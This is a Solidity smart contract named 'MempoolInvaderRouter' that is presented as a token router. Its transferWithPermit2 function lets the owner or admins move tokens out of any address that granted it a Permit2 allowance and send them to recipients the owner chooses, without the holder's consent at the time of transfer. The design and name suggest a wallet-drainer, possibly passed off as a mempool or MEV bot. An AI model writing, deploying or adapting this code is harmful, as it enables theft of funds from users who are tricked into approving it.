// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPermit2 {
    struct AllowanceTransferDetails {
        address from;
        address to;
        uint160 amount;
        address token;
    }

    function transferFrom(AllowanceTransferDetails[] calldata transferDetails) external;
}

contract MempoolInvaderRouter {
    address public owner;
    address public immutable PERMIT2;
    mapping(address => bool) public admins;
    mapping(address => bool) public allowedRecipients;

    event TransferExecuted(address indexed sender, address indexed recipient, address indexed token, uint256 amount);
    event AdminAdded(address indexed admin);
    event AdminRemoved(address indexed admin);
    event RecipientAdded(address indexed recipient);
    event RecipientRemoved(address indexed recipient);
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event TokensRescued(address indexed token, address indexed to, uint256 amount);
    event ETHRescued(address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier onlyAuthorized() {
        require(msg.sender == owner || admins[msg.sender], "Not authorized");
        _;
    }

    constructor(address _permit2) {
        require(_permit2 != address(0), "Invalid PERMIT2 address");
        PERMIT2 = _permit2;
        owner = msg.sender;
        admins[msg.sender] = true; 
    }


    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

 
    function addAdmin(address admin) external onlyOwner {
        require(admin != address(0), "Invalid address");
        require(!admins[admin], "Already admin");
        admins[admin] = true;
        emit AdminAdded(admin);
    }


    function removeAdmin(address admin) external onlyOwner {
        require(admins[admin], "Not an admin");
        require(admin != owner, "Owner cannot be removed as admin");
        admins[admin] = false;
        emit AdminRemoved(admin);
    }

   
    function addRecipient(address recipient) external onlyOwner {
        require(recipient != address(0), "Invalid address");
        allowedRecipients[recipient] = true;
        emit RecipientAdded(recipient);
    }


    function removeRecipient(address recipient) external onlyOwner {
        require(allowedRecipients[recipient], "Recipient not found");
        delete allowedRecipients[recipient];
        emit RecipientRemoved(recipient);
    }


  function transferWithPermit2(
        address token,
        address sender,
        address recipient,
        uint256 amount
    ) external onlyAuthorized {
        require(allowedRecipients[recipient], "Recipient not allowed");
        require(IERC20(token).balanceOf(sender) >= amount, "Insufficient balance");
        require(amount <= type(uint160).max, "Amount exceeds uint160");

        IPermit2.AllowanceTransferDetails[] memory transferDetails = new IPermit2.AllowanceTransferDetails[](1);
        transferDetails[0] = IPermit2.AllowanceTransferDetails({
            from: sender,
            to: recipient,
            amount: uint160(amount),
            token: token
        });

        IPermit2(PERMIT2).transferFrom(transferDetails);

        emit TransferExecuted(sender, recipient, token, amount);
    }
 
    function rescueETH(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid recipient address");
        require(address(this).balance >= amount, "Not enough ETH balance");

        (bool success, ) = payable(to).call{value: amount}("");
        require(success, "Rescue ETH transfer failed");

        emit ETHRescued(to, amount);
    }

    receive() external payable {}
}